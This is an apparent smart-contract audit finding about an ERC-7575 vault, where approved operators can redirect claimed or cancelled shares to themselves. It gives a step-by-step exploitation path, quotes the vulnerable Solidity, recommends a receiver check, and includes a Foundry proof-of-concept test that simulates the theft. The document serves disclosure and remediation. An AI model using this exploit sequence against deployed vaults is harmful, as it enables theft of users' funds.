## Title
Operators Can Steal User Shares via Arbitrary Receiver Redirection in Claim Functions

## Summary
The `claimCancelRedeemRequest()` function allows operators to redirect canceled shares to any address, including themselves, instead of returning them to the original controller. This enables operators to steal all shares from users who have approved them by initiating redeem requests, canceling them, and claiming the shares to their own address.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol`, function `claimCancelRedeemRequest()` (lines 1866-1884) [1](#0-0) 

**Intended Logic:** When a user cancels a redeem request, they expect their shares to be returned to their own address (the controller). Operators should facilitate this on behalf of the user, returning shares to the controller.

**Actual Logic:** The function accepts three parameters: `requestId`, `owner` (receiver), and `controller`. The authorization check verifies that `msg.sender` is either the controller or an approved operator of the controller. However, shares are transferred to the `owner` parameter without validating that `owner == controller`. This allows an operator to specify ANY address as the receiver, including themselves. [2](#0-1) [3](#0-2) 

**Exploitation Path:**
1. Alice approves Bob as her operator via `shareToken.setOperator(bob, true)` for legitimate custody purposes [4](#0-3) 

2. Bob calls `requestRedeem(1000 shares, alice, alice)` - Alice's shares are transferred from Alice to the vault, creating a pending redeem request [5](#0-4) 

3. Bob immediately calls `cancelRedeemRequest(0, alice)` - shares move from `pendingRedeemShares[alice]` to `pendingCancelRedeemShares[alice]` [6](#0-5) 

4. Investment Manager calls `fulfillCancelRedeemRequest(alice)` - shares move from pending to claimable state [7](#0-6) 

5. Bob calls `claimCancelRedeemRequest(0, bob, alice)` where `owner=bob` (receiver) and `controller=alice` - the authorization check passes because Bob is Alice's operator, but shares are transferred to Bob instead of Alice [1](#0-0) 

**Security Property Broken:** Violates invariant #12 "No Fund Theft: No double-claims, no reentrancy, no authorization bypass" - the operator can redirect user funds to themselves despite being authorized only to act on behalf of the user, not to steal from them.

## Impact Explanation
- **Affected Assets**: All user shares across all vaults in the multi-asset system. Any user who has approved an operator is vulnerable.
- **Damage Severity**: 100% loss of shares for affected users. An operator can steal all shares from every user who has approved them as an operator.
- **User Impact**: Any user who approves an operator for legitimate purposes (custody, management, claim delegation) can have all their shares stolen. The same vulnerability exists in `claimCancelDepositRequest()`, `deposit()`, `mint()`, `redeem()`, and `withdraw()` functions, making this a systemic issue across all claim operations. [8](#0-7) [9](#0-8) [10](#0-9) 

## Likelihood Explanation
- **Attacker Profile**: Any address that has been approved as an operator by users. This is not a protocol admin role but a user-level delegation.
- **Preconditions**: User must have approved the attacker as an operator via `setOperator()`. Users often grant operator permissions for legitimate custody or management purposes without understanding the full extent of operator powers.
- **Execution Complexity**: Single transaction sequence with no timing requirements. The operator can execute all steps independently without user interaction.
- **Frequency**: Can be executed once per user who has approved the operator. The operator can systematically drain all users who have granted them operator status.

## Recommendation

Add validation to ensure the receiver parameter matches the controller when called by an operator:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function claimCancelRedeemRequest, after line 1870:

function claimCancelRedeemRequest(uint256 requestId, address owner, address controller) external nonReentrant {
    if (requestId != REQUEST_ID) revert InvalidRequestId();
    VaultStorage storage $ = _getVaultStorage();
    if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
        revert InvalidCaller();
    }

    // FIXED: Validate that operators cannot redirect shares away from the controller
    // Only the controller themselves can specify a different receiver
    if (msg.sender != controller && owner != controller) {
        revert InvalidReceiver(); // New error: operators must send to controller
    }

    uint256 shares = $.claimableCancelRedeemShares[controller];
    if (shares == 0) revert CancelationNotClaimable();

    // CEI: State changes before external transfer
    delete $.claimableCancelRedeemShares[controller];
    $.controllersWithPendingRedeemCancelations.remove(controller);

    // External interaction
    SafeTokenTransfers.safeTransfer($.shareToken, owner, shares);

    // Event emission
    emit CancelRedeemRequestClaimed(controller, owner, REQUEST_ID, shares);
}
```

Apply the same fix to:
- `claimCancelDepositRequest()` (line 1691)
- `deposit()` (line 557)  
- `mint()` (line 633)
- `redeem()` (line 885)
- `withdraw()` (line 927)

Alternative approach: Remove the `receiver` parameter entirely and always transfer to the controller for claim functions initiated by operators.

## Proof of Concept

```solidity
// File: test/Exploit_OperatorShareTheft.t.sol
// Run with: forge test --match-test test_OperatorCanStealSharesViaCancelation -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "./MockAsset.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

contract Exploit_OperatorShareTheft is Test {
    ERC7575VaultUpgradeable public vault;
    ShareTokenUpgradeable public shareToken;
    MockAsset public asset;
    
    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice"); // victim
    address public bob = makeAddr("bob");     // malicious operator
    address public investmentManager = makeAddr("investmentManager");
    
    function setUp() public {
        vm.startPrank(owner);
        
        asset = new MockAsset();
        
        // Deploy ShareToken with proxy
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory shareTokenInitData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, 
            "Test Shares", 
            "TST", 
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), shareTokenInitData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy Vault with proxy
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory vaultInitData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector,
            IERC20Metadata(address(asset)),
            address(shareToken),
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), vaultInitData);
        vault = ERC7575VaultUpgradeable(address(vaultProxy));
        
        shareToken.registerVault(address(asset), address(vault));
        shareToken.setInvestmentManager(investmentManager);
        
        vm.stopPrank();
        
        // Mint assets to alice
        asset.mint(alice, 100000e18);
    }
    
    function test_OperatorCanStealSharesViaCancelation() public {
        uint256 depositAmount = 10000e18;
        
        // SETUP: Alice deposits and gets shares
        vm.startPrank(alice);
        asset.approve(address(vault), depositAmount);
        vault.requestDeposit(depositAmount, alice, alice);
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vault.fulfillDeposit(alice, depositAmount);
        
        vm.prank(alice);
        uint256 shares = vault.deposit(depositAmount, alice, alice);
        
        uint256 aliceSharesBefore = shareToken.balanceOf(alice);
        uint256 bobSharesBefore = shareToken.balanceOf(bob);
        
        console.log("Alice shares before attack:", aliceSharesBefore);
        console.log("Bob shares before attack:", bobSharesBefore);
        
        // EXPLOIT STEP 1: Alice approves Bob as operator (for legitimate purposes)
        vm.prank(alice);
        shareToken.setOperator(bob, true);
        
        // EXPLOIT STEP 2: Bob (malicious operator) requests redeem on Alice's behalf
        vm.prank(bob);
        vault.requestRedeem(shares, alice, alice);
        
        assertEq(shareToken.balanceOf(alice), 0, "Alice's shares should be in vault");
        assertEq(shareToken.balanceOf(address(vault)), shares, "Vault should hold shares");
        
        // EXPLOIT STEP 3: Bob immediately cancels the redeem request
        vm.prank(bob);
        vault.cancelRedeemRequest(0, alice);
        
        // EXPLOIT STEP 4: Investment manager fulfills the cancelation
        vm.prank(investmentManager);
        vault.fulfillCancelRedeemRequest(alice);
        
        // EXPLOIT STEP 5: Bob claims the shares to HIMSELF instead of Alice
        vm.prank(bob);
        vault.claimCancelRedeemRequest(0, bob, alice); // receiver=bob, controller=alice
        
        // VERIFY: Bob has stolen Alice's shares
        uint256 aliceSharesAfter = shareToken.balanceOf(alice);
        uint256 bobSharesAfter = shareToken.balanceOf(bob);
        
        console.log("Alice shares after attack:", aliceSharesAfter);
        console.log("Bob shares after attack:", bobSharesAfter);
        
        assertEq(aliceSharesAfter, 0, "Alice should have 0 shares - stolen!");
        assertEq(bobSharesAfter, shares, "Bob should have all of Alice's shares");
        assertEq(aliceSharesBefore, shares, "Alice had shares before");
        assertEq(bobSharesAfter - bobSharesBefore, shares, "Bob gained all shares");
        
        // Vulnerability confirmed: Operator stole all shares by redirecting to themselves
    }
}
```

## Notes

This vulnerability stems from the ERC-7887 specification's separation of authorization (`owner`/`controller`) and beneficiary (`receiver`) parameters. While this design may enable legitimate use cases like custodial claiming, it creates a critical security risk when operators are not fully trusted parties. 

The protocol's trust model explicitly excludes operators from the list of trusted roles, treating them as user-level delegations similar to ERC-20 approvals. However, unlike ERC-20 `approve()` which grants limited spending power, ERC-7540 operators have unlimited power to initiate requests and redirect all claims.

The existing test suite only demonstrates honest operator behavior where operators claim to the controller's address, not to arbitrary addresses. This suggests the attack vector was not fully considered during development. [11](#0-10) 

The same vulnerability pattern exists across all claim functions (`deposit`, `mint`, `redeem`, `withdraw`, `claimCancelDepositRequest`), making this a systemic issue affecting the entire async request lifecycle, not just cancelations.

### Citations

**File:** src/ERC7575VaultUpgradeable.sol (L557-589)
```text
    function deposit(uint256 assets, address receiver, address controller) public nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (assets == 0) revert ZeroAssets();

        uint256 availableShares = $.claimableDepositShares[controller];
        uint256 availableAssets = $.claimableDepositAssets[controller];

        if (assets > availableAssets) revert InsufficientClaimableAssets();

        // Calculate shares proportionally from the stored asset-share ratio
        shares = assets.mulDiv(availableShares, availableAssets, Math.Rounding.Floor);
        if (shares == 0) revert ZeroSharesCalculated();

        // Remove from active deposit requesters if no more claimable assets
        if (availableAssets == assets) {
            $.activeDepositRequesters.remove(controller);
            delete $.claimableDepositShares[controller];
            delete $.claimableDepositAssets[controller];
        } else {
            $.claimableDepositShares[controller] -= shares;
            $.claimableDepositAssets[controller] -= assets;
        }

        emit Deposit(receiver, controller, assets, shares);

        // Transfer shares from vault to receiver using ShareToken
        if (!IERC20Metadata($.shareToken).transfer(receiver, shares)) {
            revert ShareTransferFailed();
        }
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L715-750)
```text
    function requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {
        if (shares == 0) revert ZeroShares();
        VaultStorage storage $ = _getVaultStorage();

        // ERC7540 REQUIREMENT: Authorization check for redemption
        // Per spec: "Redeem Request approval of shares for a msg.sender NOT equal to owner may come
        // either from ERC-20 approval over the shares of owner or if the owner has approved the
        // msg.sender as an operator."
        bool isOwnerOrOperator = owner == msg.sender || IERC7540($.shareToken).isOperator(owner, msg.sender);
        if (!isOwnerOrOperator) {
            ShareTokenUpgradeable($.shareToken).spendAllowance(owner, msg.sender, shares);
        }

        uint256 ownerShares = IERC20Metadata($.shareToken).balanceOf(owner);
        if (ownerShares < shares) {
            revert ERC20InsufficientBalance(owner, ownerShares, shares);
        }

        // ERC7887: Block new redeem requests while cancelation is pending for this controller
        if ($.controllersWithPendingRedeemCancelations.contains(controller)) {
            revert RedeemCancelationPending();
        }

        // Pull-Then-Credit pattern: Transfer shares first before updating state
        // This ensures we only credit shares that have been successfully received
        if (!ShareTokenUpgradeable($.shareToken).vaultTransferFrom(owner, address(this), shares)) {
            revert ShareTransferFailed();
        }

        // State changes after successful transfer
        $.pendingRedeemShares[controller] += shares;
        $.activeRedeemRequesters.add(controller);

        // Event emission
        emit RedeemRequest(controller, owner, REQUEST_ID, msg.sender, shares);
        return REQUEST_ID;
```

**File:** src/ERC7575VaultUpgradeable.sol (L885-918)
```text
    function redeem(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (shares == 0) revert ZeroShares();

        uint256 availableShares = $.claimableRedeemShares[controller];
        if (shares > availableShares) revert InsufficientClaimableShares();

        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);

        if (assets == availableAssets) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }
        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1081-1091)
```text
    function fulfillCancelRedeemRequest(address controller) external returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();

        shares = $.pendingCancelRedeemShares[controller];
        if (shares == 0) revert NoPendingCancelRedeem();

        // Move from pending to claimable cancelation state
        delete $.pendingCancelRedeemShares[controller];
        $.claimableCancelRedeemShares[controller] += shares;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1691-1711)
```text
    function claimCancelDepositRequest(uint256 requestId, address receiver, address controller) external nonReentrant {
        if (requestId != REQUEST_ID) revert InvalidRequestId();
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }

        uint256 assets = $.claimableCancelDepositAssets[controller];
        if (assets == 0) revert CancelationNotClaimable();

        // CEI: State changes before external transfer
        delete $.claimableCancelDepositAssets[controller];
        $.totalCancelDepositAssets -= assets;
        $.controllersWithPendingDepositCancelations.remove(controller);

        // External interaction
        SafeTokenTransfers.safeTransfer($.asset, receiver, assets);

        // Event emission
        emit CancelDepositRequestClaimed(controller, receiver, REQUEST_ID, assets);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1745-1764)
```text
    function cancelRedeemRequest(uint256 requestId, address controller) external nonReentrant {
        VaultStorage storage $ = _getVaultStorage();
        if (requestId != REQUEST_ID) revert InvalidRequestId();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }

        uint256 pendingShares = $.pendingRedeemShares[controller];
        if (pendingShares == 0) revert NoPendingCancelRedeem();

        // Move from pending to pending cancelation
        delete $.pendingRedeemShares[controller];
        $.pendingCancelRedeemShares[controller] = pendingShares;

        // Block new redeem requests
        $.controllersWithPendingRedeemCancelations.add(controller);
        $.activeRedeemRequesters.remove(controller);

        emit CancelRedeemRequest(controller, controller, REQUEST_ID, msg.sender, pendingShares);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1866-1884)
```text
    function claimCancelRedeemRequest(uint256 requestId, address owner, address controller) external nonReentrant {
        if (requestId != REQUEST_ID) revert InvalidRequestId();
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }

        uint256 shares = $.claimableCancelRedeemShares[controller];
        if (shares == 0) revert CancelationNotClaimable();

        // CEI: State changes before external transfer
        delete $.claimableCancelRedeemShares[controller];
        $.controllersWithPendingRedeemCancelations.remove(controller);

        // External interaction
        SafeTokenTransfers.safeTransfer($.shareToken, owner, shares);

        // Event emission
        emit CancelRedeemRequestClaimed(controller, owner, REQUEST_ID, shares);
```

**File:** src/ShareTokenUpgradeable.sol (L480-486)
```text
    function setOperator(address operator, bool approved) external virtual returns (bool) {
        if (msg.sender == operator) revert CannotSetSelfAsOperator();
        ShareTokenStorage storage $ = _getShareTokenStorage();
        $.operators[msg.sender][operator] = approved;
        emit OperatorSet(msg.sender, operator, approved);
        return true;
    }
```

**File:** test/OperatorRedemptionTest.t.sol (L276-277)
```text
        vm.prank(bob);
        uint256 receivedAssets = vault.redeem(shares, alice, alice);
```
